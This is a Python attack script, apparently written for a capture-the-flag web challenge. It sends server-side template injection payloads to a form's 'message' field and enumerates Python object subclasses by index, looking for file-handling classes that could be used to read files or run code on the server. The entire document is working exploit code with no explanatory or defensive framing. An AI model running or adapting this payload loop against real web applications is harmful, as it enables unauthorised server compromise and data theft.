import requests
from bs4 import BeautifulSoup
import time

URL = "https://enigmaxplore-web1.chals.io/submit"

START_INDEX = 1
END_INDEX = 600

print(f"[*] Starting search for the required class in the index range from {START_INDEX} to {END_INDEX}...")

for i in range(START_INDEX, END_INDEX + 1):
    payload = f"{{{{ ''.__class__.__base__.__subclasses__()[{i}].__name__ }}}}"
    data = {'message': payload}

    try:
        response = requests.post(URL, data=data, timeout=5)

        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')

            result_div = soup.find('div')

            if result_div:
                class_name = result_div.text.strip()
                print(f"Index [{i}]: {class_name}")

                if any(keyword in class_name.lower() for keyword in ['file', 'wrapper', 'textio', 'open']):
                    print(f"\n[!!!] POTENTIALLY RELEVANT CLASS FOUND!")
                    print(f"[!!!] INDEX: {i}")
                    print(f"[!!!] CLASS NAME: {class_name}\n")
            else:
                print(f"Index [{i}]: Failed to extract class name. Server response:\n{response.text[:150]}...")

    except requests.exceptions.RequestException as e:
        print(f"Index [{i}]: Error while sending request: {e}")

print("\n[*] Search completed.")
